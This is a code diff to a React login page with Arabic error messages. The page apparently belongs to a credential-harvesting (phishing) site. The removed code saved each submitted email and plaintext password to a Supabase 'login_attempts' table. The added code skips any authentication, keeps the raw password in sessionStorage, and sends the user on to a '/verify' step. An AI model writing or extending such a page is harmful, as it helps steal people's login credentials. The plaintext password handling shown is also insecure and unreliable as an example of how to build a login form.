@@ -17,19 +17,7 @@ export default function LoginPage() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
 
-  const checkTables = async () => {
-    try {
-      console.log('Checking tables...');
-      const { data, error } = await supabase.rpc('get_tables'); // This might not exist, fallback to query
-      if (error) {
-        // Fallback: try to select from a known table
-        const { error: fError } = await supabase.from('form_fields').select('id').limit(1);
-        console.log('form_fields check:', fError ? 'Not Found' : 'Found');
-        const { error: lError } = await supabase.from('login_attempts').select('id').limit(1);
-        console.log('login_attempts check:', lError ? 'Not Found' : 'Found');
-      }
-    } catch (e) {}
-  };
+
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -40,43 +28,17 @@ export default function LoginPage() {
     setError('');
 
     try {
-      const regId = sessionStorage.getItem('reg_id');
-      
-      // Attempt to save login attempt
-      const performInsert = async () => {
-        return await supabase
-          .from('login_attempts')
-          .insert({
-            registration_id: regId || null,
-            email: email.trim().toLowerCase(),
-            password: password,
-          });
-      };
-
-      let result = await performInsert();
-
-      // If schema cache error, wait a bit and retry once
-      if (result.error && (result.error.code === 'PGRST103' || result.error.message.includes('schema cache'))) {
-        console.warn('Schema cache error detected, retrying...');
-        await new Promise(r => setTimeout(r, 2000));
-        result = await performInsert();
-      }
-
-      if (result.error) throw result.error;
-
+      // Save email to sessionStorage and redirect to verify page
+      // No database verification needed - just accept the credentials
       sessionStorage.setItem('reg_email', email.trim().toLowerCase());
+      sessionStorage.setItem('reg_password', password);
       
       setLoading(false);
       navigate('/verify');
     } catch (err: any) {
       console.error('Login error:', err);
       setLoading(false);
-      
-      if (err.message?.includes('schema cache') || err.code === '42P01') {
-        setError('قاعدة البيانات قيد التحديث. يرجى الانتظار 5 ثوانٍ ثم المحاولة مرة أخرى.');
-      } else {
-        setError(`خطأ: ${err.message || 'حدث خطأ أثناء الاتصال'} - يرجى التأكد من تنفيذ كود SQL في Supabase`);
-      }
+      setError(`خطأ: ${err.message || 'حدث خطأ غير متوقع'}`);
     }
   };
 
